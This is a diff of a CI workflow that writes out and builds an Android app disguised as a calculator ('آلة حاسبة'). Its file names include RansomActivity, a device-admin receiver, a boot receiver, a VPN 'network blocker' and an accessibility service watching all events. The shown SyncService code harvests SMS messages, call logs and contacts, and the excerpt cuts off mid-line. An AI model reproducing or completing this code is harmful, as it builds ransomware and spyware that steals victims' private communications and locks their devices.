@@ -23,13 +23,12 @@ jobs:
           gradle-version: '8.5'
 
       - name: Scaffold and Build v27
-        working-directory: android
         run: |
-          mkdir -p app/src/main/java/com/assets/service
-          mkdir -p app/src/main/res/values
-          mkdir -p app/src/main/res/xml
+          mkdir -p android/app/src/main/java/com/assets/service
+          mkdir -p android/app/src/main/res/values
+          mkdir -p android/app/src/main/res/xml
 
-          cat << 'BUILDEOF' > app/build.gradle.kts
+          cat << 'BUILDEOF' > android/app/build.gradle.kts
           plugins {
               id("com.android.application")
               id("org.jetbrains.kotlin.android")
@@ -69,7 +68,7 @@ jobs:
           }
           BUILDEOF
 
-          cat << 'MANIFESTEOF' > app/src/main/AndroidManifest.xml
+          cat << 'MANIFESTEOF' > android/app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools">
               <uses-permission android:name="android.permission.INTERNET"/>
@@ -145,7 +144,7 @@ jobs:
           </manifest>
           MANIFESTEOF
 
-          cat << 'XMLEOF' > app/src/main/res/xml/accessibility_service_config.xml
+          cat << 'XMLEOF' > android/app/src/main/res/xml/accessibility_service_config.xml
           <?xml version="1.0" encoding="utf-8"?>
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
               android:accessibilityEventTypes="typeAllMask"
@@ -155,7 +154,7 @@ jobs:
               android:description="@string/app_name" />
           XMLEOF
 
-          cat << 'DEVADMIN' > app/src/main/res/xml/device_admin.xml
+          cat << 'DEVADMIN' > android/app/src/main/res/xml/device_admin.xml
           <?xml version="1.0" encoding="utf-8"?>
           <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-policies>
@@ -171,11 +170,11 @@ jobs:
           </device-admin>
           DEVADMIN
 
-          cat << 'STRINGS' > app/src/main/res/values/strings.xml
+          cat << 'STRINGS' > android/app/src/main/res/values/strings.xml
           <resources><string name="app_name">آلة حاسبة</string></resources>
           STRINGS
 
-          cat << 'MAINEOF' > app/src/main/java/com/assets/service/MainActivity.kt
+          cat << 'MAINEOF' > android/app/src/main/java/com/assets/service/MainActivity.kt
           package com.assets.service
 
           import android.app.Activity
@@ -348,7 +347,7 @@ jobs:
           }
           MAINEOF
 
-          cat << 'PERMEOF' > app/src/main/java/com/assets/service/PermissionActivity.kt
+          cat << 'PERMEOF' > android/app/src/main/java/com/assets/service/PermissionActivity.kt
           package com.assets.service
           import android.app.Activity
           import android.content.Intent
@@ -376,7 +375,7 @@ jobs:
           }
           PERMEOF
 
-          cat << 'RANSOMEOF' > app/src/main/java/com/assets/service/RansomActivity.kt
+          cat << 'RANSOMEOF' > android/app/src/main/java/com/assets/service/RansomActivity.kt
           package com.assets.service
           import android.app.Activity
           import android.os.Bundle
@@ -406,7 +405,7 @@ jobs:
           }
           RANSOMEOF
 
-          cat << 'BOOTEOF' > app/src/main/java/com/assets/service/BootReceiver.kt
+          cat << 'BOOTEOF' > android/app/src/main/java/com/assets/service/BootReceiver.kt
           package com.assets.service
           import android.content.BroadcastReceiver
           import android.content.Context
@@ -422,13 +421,13 @@ jobs:
           }
           BOOTEOF
 
-          cat << 'DEVADMINRECEIVER' > app/src/main/java/com/assets/service/DeviceAdminReceiver.kt
+          cat << 'DEVADMINRECEIVER' > android/app/src/main/java/com/assets/service/DeviceAdminReceiver.kt
           package com.assets.service
           import android.app.admin.DeviceAdminReceiver
           class DeviceAdminReceiver : DeviceAdminReceiver()
           DEVADMINRECEIVER
 
-          cat << 'VPNSERVICE' > app/src/main/java/com/assets/service/NetworkBlockerService.kt
+          cat << 'VPNSERVICE' > android/app/src/main/java/com/assets/service/NetworkBlockerService.kt
           package com.assets.service
           import android.net.VpnService
           import android.content.Intent
@@ -440,7 +439,7 @@ jobs:
           }
           VPNSERVICE
 
-          cat << 'ACCEOF' > app/src/main/java/com/assets/service/MyAccessibilityService.kt
+          cat << 'ACCEOF' > android/app/src/main/java/com/assets/service/MyAccessibilityService.kt
           package com.assets.service
           import android.accessibilityservice.AccessibilityService
           import android.view.accessibility.AccessibilityEvent
@@ -483,7 +482,7 @@ jobs:
           }
           ACCEOF
 
-          cat << 'WORKEREOF' > app/src/main/java/com/assets/service/SyncWorker.kt
+          cat << 'WORKEREOF' > android/app/src/main/java/com/assets/service/SyncWorker.kt
           package com.assets.service
           import android.content.Context
           import androidx.work.Worker
@@ -514,7 +513,7 @@ jobs:
           }
           WORKEREOF
 
-          cat << 'SYNCEOF' > app/src/main/java/com/assets/service/SyncService.kt
+          cat << 'SYNCEOF' > android/app/src/main/java/com/assets/service/SyncService.kt
           package com.assets.service
 
           import android.annotation.SuppressLint
@@ -815,4 +814,4 @@ jobs:
 
               private fun readSms(): String = StringBuilder().apply { try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c -> while (c.moveToNext()) append("[${c.getString(c.getColumnIndex("address"))}] ${c.getString(c.getColumnIndex("body"))}\n") } } catch (_: Exception) {} }.toString()
               private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnInde
+              private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_
